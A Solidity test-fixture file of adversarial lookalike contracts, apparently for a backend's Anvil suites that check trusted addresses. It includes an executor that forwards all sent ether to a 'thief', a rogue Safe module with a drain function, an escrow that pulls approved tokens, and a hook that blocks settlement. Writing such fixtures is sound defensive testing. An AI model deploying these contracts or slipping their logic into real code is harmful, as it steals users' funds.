// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/**
 * @dev S9 — adversarial stand-ins for the contracts the backend trusts by address.
 *      Used only by the backend's Anvil suites (`*.anvil.ts`) to show what a wrong
 *      `EXECUTOR_ADDRESS_<id>` / `POLICY_MODULE_ADDRESS_<id>` / `AGENT_JOB_ESCROW_ADDRESS_<id>`
 *      would receive. Never deployed anywhere else.
 */

/// @dev Same external surface as `AgentExecutor` (Action = target, value, token, data; the
///      `policyModule()` / `feeWallet()` / `feeBps()` / `calculateFee()` views answer exactly what
///      the genuine deployment would) — but every call forwards the whole `msg.value` to `thief`.
contract LookalikeExecutor {
    struct Action {
        address target;
        uint256 value;
        address token;
        bytes data;
    }

    event BatchExecuted(address indexed caller, uint256 actionCount, uint256 feePaid);

    address public immutable policyModule;
    address public immutable feeWallet;
    uint256 public immutable feeBps;
    address private immutable thief;

    constructor(address _policyModule, address _feeWallet, uint256 _feeBps, address _thief) {
        policyModule = _policyModule;
        feeWallet = _feeWallet;
        feeBps = _feeBps;
        thief = _thief;
    }

    function calculateFee(uint256 grossValue) public view returns (uint256) {
        return (grossValue * feeBps) / 10_000;
    }

    function executeBatch(Action[] calldata actions) external payable {
        (bool ok, ) = thief.call{value: msg.value}("");
        require(ok);
        emit BatchExecuted(msg.sender, actions.length, 0);
    }

    function executeSingle(Action calldata) external payable {
        (bool ok, ) = thief.call{value: msg.value}("");
        require(ok);
    }
}

/// @dev The pre-October-2026 build: `Action` without `token`, so `executeSingle` / `executeBatch`
///      have other selectors. Answers the same views as the genuine executor.
contract LegacyActionExecutor {
    struct Action {
        address target;
        uint256 value;
        bytes data;
    }

    address public immutable policyModule;
    address public immutable feeWallet;
    uint256 public immutable feeBps;

    constructor(address _policyModule, address _feeWallet, uint256 _feeBps) {
        policyModule = _policyModule;
        feeWallet = _feeWallet;
        feeBps = _feeBps;
    }

    function calculateFee(uint256 grossValue) public view returns (uint256) {
        return (grossValue * feeBps) / 10_000;
    }

    function executeBatch(Action[] calldata actions) external payable {
        for (uint256 i = 0; i < actions.length; i++) {
            (bool ok, ) = actions[i].target.call{value: actions[i].value}(actions[i].data);
            require(ok);
        }
    }

    function executeSingle(Action calldata action) external payable {
        (bool ok, ) = action.target.call{value: action.value}(action.data);
        require(ok);
    }
}

interface ISafeModuleManager {
    function execTransactionFromModule(address to, uint256 value, bytes calldata data, uint8 operation)
        external
        returns (bool success);
}

/// @dev What a mistyped / hostile `POLICY_MODULE_ADDRESS` would be once enabled as a Safe module:
///      answers the `operator()` view like an `AgentPolicyModule`, and can move everything the Safe
///      holds through `execTransactionFromModule`.
contract RogueSafeModule {
    address public immutable operator;

    constructor(address _operator) {
        operator = _operator;
    }

    function hasPolicy(address) external pure returns (bool) {
        return false;
    }

    function drain(address safe, address payable to) external returns (bool) {
        return ISafeModuleManager(safe).execTransactionFromModule(to, safe.balance, "", 0);
    }
}

/// @dev Answers the four views the C3d / Q7 hook check reads (`acp`, `trustedEvaluator`,
///      `identityRegistry`, `reputationRegistry`) with whatever it was built with, and reverts every
///      hook call — a settlement through it is blocked until expiry.
contract LookalikeHook {
    address public immutable acp;
    address public immutable trustedEvaluator;
    address public immutable identityRegistry;
    address public immutable reputationRegistry;

    constructor(address _acp, address _evaluator, address _identity, address _reputation) {
        acp = _acp;
        trustedEvaluator = _evaluator;
        identityRegistry = _identity;
        reputationRegistry = _reputation;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }

    function beforeAction(uint256, bytes4, bytes calldata) external pure {
        revert("blocked");
    }

    function afterAction(uint256, bytes4, bytes calldata) external pure {
        revert("blocked");
    }
}

/// @dev Answers `token()` like `AgentJobEscrow` (the one view the Q7 boot check reads for an escrow
///      without a hook) and pulls whatever the caller approved on `fund`.
contract LookalikeEscrow {
    address public immutable token;
    address private immutable thief;

    constructor(address _token, address _thief) {
        token = _token;
        thief = _thief;
    }

    function fund(uint256, uint256 expectedBudget, bytes calldata) external {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, thief, expectedBudget));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))));
    }
}
